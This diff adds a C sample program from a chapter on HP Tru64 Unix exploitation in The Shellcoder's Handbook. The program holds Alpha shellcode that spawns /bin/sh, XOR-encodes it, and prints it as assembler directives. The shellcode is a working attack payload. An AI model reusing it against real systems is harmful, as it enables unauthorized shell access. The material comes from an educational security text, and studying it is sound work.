@@ -1,0 +1,44 @@
+/*
+
+The Shellcoder's Handbook: Discovering and Exploiting Security Holes
+Jack Koziol, David Litchfield, Dave Aitel, Chris Anley, 
+Sinan Eren, Neel Mehta, Riley Hassell
+Publisher: John Wiley & Sons
+ISBN: 0764544683
+
+Chapter 13: HP Tru64 Unix Exploitation
+Sample Program #5
+
+Please send comments/feedback to jack@infosecinstitute.com or visit http://www.infosecinstitute.com 
+
+*/
+
+
+unsigned int shellcode[] = 
+{
+0x47c1f11e,
+0x4206140d,
+0xb5be0000,
+0x43e2f400,
+0xb7fe0008,
+0x47ff0410,
+0x00000083,
+0x47de0411,
+0x45ad0410,
+0x47ff0412,
+0x43e77400,
+0x00000083,
+0x69622f2f,
+0x68732f6e,
+0x00000000
+};
+
+int
+main()
+{
+    int i;
+
+     //printf("sizeof shellcode %d\n", sizeof(shellcode));
+     for(i =0 ; i < sizeof(shellcode)/4; i++)
+           printf(".long\t0x%.8x\n", shellcode[i] ^= 0x88888888);
+}
